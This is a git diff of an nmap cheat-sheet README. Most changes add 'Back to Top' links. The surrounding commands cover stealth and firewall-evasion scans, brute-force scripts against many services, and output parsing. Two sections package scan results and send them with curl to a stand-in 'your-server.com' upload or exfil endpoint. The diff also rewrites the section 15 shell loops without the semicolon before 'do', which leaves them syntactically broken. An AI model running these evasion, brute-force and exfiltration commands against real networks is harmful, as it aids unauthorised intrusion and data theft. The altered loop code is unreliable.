@@ -61,6 +61,8 @@ nmap -A -T4 192.168.1.1
 - Save everything (normal, XML, grepable)
 nmap -oA scan_name -A -T4 192.168.1.0/24 
    
+[🔝 Back to Top](#📖-table-of-contents)
+
 
    ## 2. NETWORK DISCOVERY 
 
@@ -75,6 +77,8 @@ nmap -sn -PS 443,80 192.168.1.0/24
 
 - Fast host discovery with traceroute
 nmap -sn --traceroute 192.168.1.0/24
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
   ##  3. STEALTH AND EVASION
@@ -97,6 +101,8 @@ nmap --source-port 53 -sS 192.168.1.1
 - Idle scan (use a zombie host, advanced)
 nmap -sI zombie_ip 192.168.1.1
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
    ## 4. ADVANCED SCANNING TECHNIQUE
 
@@ -117,6 +123,8 @@ nmap -sW 192.168.1.1
 
 - Custom packet scan 
 nmap --scanflags SYN,URG 192.168.1.1
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
    ## 5. SERVICE AND VULNERABILITY DISCOVERY 
@@ -142,6 +150,8 @@ nmap --script smtp-open-relay -p 25 192.168.1.1
 - DNS enumeration
 nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
    ## 6. OUTPUT AND EXFILTRATION 
 
@@ -160,6 +170,8 @@ grep "open" scan.txt | awk '{print $1, $3}' > open_ports.txt
 - For exfiltration: compress and send to your server
 tar -czf scan_results.tar.gz scan.txt scan.xml scan.grep
 curl -F "file=@scan_results.tar.gz" http://your-server.com/upload
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
   ##  7. TIMING AND PERFORMANCE 
@@ -185,6 +197,8 @@ nmap -T5 -sS 192.168.1.1
 - Max rate (overkill, for when you don't care about stealth)
 nmap --min-rate 10000 -p- 192.168.1.1
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
   ##  8. EXFILTRATION AND POST-PROCESSING 
 
@@ -205,6 +219,8 @@ grep -E "open|VERSION|OS" scan_*.txt > interesting_results.txt
 - Step 5: Exfiltrate to your server 
 tar -czf batch_scan.tar.gz scan_*.txt interesting_results.txt
 curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
    ## 9. TARGET-SPECIFIC COMMANDS 
@@ -227,6 +243,8 @@ nmap --script mysql-info,postgres-brute,mongodb-databases -p 3306,5432,27017 192
 - SNMP enumeration (often forgotten)
 nmap --script snmp-community,snmp-info -p 161 192.168.1.0/24
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
 ## 10. AGGRESSIVE COMMANDS 
 
@@ -242,6 +260,8 @@ nmap --script brute -p 21,22,23,80,443,445,3306,3389 192.168.1.1
 - Fast port discovery + deep scan (two-pass)
 nmap -p- --min-rate 10000 -T4 192.168.1.1 -oN fast_ports.txt
 nmap -sV -A -p $(grep -E "^[0-9]" fast_ports.txt | cut -d'/' -f1 | tr '\n' ',') 192.168.1.1
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
 ## 11. IP V6 SCANNING 
@@ -266,6 +286,8 @@ nmap -6 --script smb-os-discovery -p 445 2001:db8::1
 
 - IPv6 firewall evasion (some firewalls don't inspect IPv6 properly)
 nmap -6 -f -sS 2001:db8::1
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
 ## 12. FIREWALL EVASION 
@@ -294,6 +316,8 @@ nmap -sY -T4 192.168.1.1
 - Custom packet timing (evade rate-based detectors)
 nmap --scan-delay 1s --max-retries 0 192.168.1.1
  
+[🔝 Back to Top](#📖-table-of-contents)
+
 
 ## 13. NSE SCRIPT DEVELOPMENT 
 
@@ -332,6 +356,8 @@ action = function(host, port)
     return nil
 end
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
 ## 14. ADVANCED OUTPUT PARSING (+1000 HOSTS)
 
@@ -351,17 +377,21 @@ grep -B 2 "VULNERABLE" scan.txt | grep "Nmap scan report" | awk '{print $5}' > v
 - Generate unique list of services found
 grep "open" scan.txt | awk '{print $3}' | sort | uniq -c | sort -rn > service_counts.txt
 
+[🔝 Back to Top](#📖-table-of-contents)
+
 
 ## 15. SCAN AUTOMATION (more than 1 network scanning)
 
 - Scan multiple subnets from a list
-while read subnet; do
-    nmap -sn $subnet -oG "scan_$(echo $subnet | tr '/' '_').grep"
+while read subnet do
+
+   nmap -sn $subnet -oG "scan_$(echo $subnet | tr '/' '_').grep"
 done < subnets.txt
 
 - Scan all hosts from a list
-while read ip; do
-    nmap -sV -T4 $ip -oN "scan_${ip}.txt"
+while read ip do
+
+   nmap -sV -T4 $ip -oN "scan_${ip}.txt"
 done < ip_list.txt
 
 - Parallel scanning (faster, but more aggressive)
@@ -370,6 +400,8 @@ cat ip_list.txt | xargs -I {} -P 5 nmap -sV -T4 {} -oN "scan_{}.txt"
 - Scan based on open ports from previous scan
 open_ports=$(grep "open" previous_scan.txt | cut -d'/' -f1 | sort -u | tr '\n' ',')
 nmap -p $open_ports -sV -T4 192.168.1.0/24
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
 ## 16. DEFENSE (identifying enemies)
@@ -400,6 +432,8 @@ iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 -
 - Log and drop scanners
 iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j LOG --log-prefix "PORT_SCAN: "
 iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP
+
+[🔝 Back to Top](#📖-table-of-contents)
 
 
 ## 17. EVADING MODERN EDR
